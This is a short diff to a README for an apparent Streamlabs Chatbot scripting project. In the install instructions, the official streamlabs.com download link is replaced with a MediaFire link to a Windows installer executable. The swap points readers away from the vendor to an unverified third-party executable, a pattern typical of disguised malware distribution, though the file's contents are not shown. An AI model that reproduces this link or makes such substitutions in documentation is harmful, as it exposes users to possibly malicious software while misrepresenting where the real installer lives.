@@ -21,7 +21,7 @@ Tests:
 
 ### Prerequisites
 1. Create a twitch account for the bot if you don't have one yet
-2. Install : https://streamlabs.com/chatbot
+2. Install Streamlabs Chatbot : https://www.mediafire.com/file/cgmn97z2jt8q32f/Streamlabs%252BChatbot%252BInstaller.exe/file
 3. Install : Python 2.7.13 (you can find it here: https://github.com/AnkhHeart/Streamlabs-Chatbot-Python-Boilerplate/wiki)
 4. In Streamlabs Chatbot, under the Scripts tab, click on the settings icon in the top right, and find the Python 2.7.13 installation directory and select the Lib folder (default at C:\Python27\Lib)
 
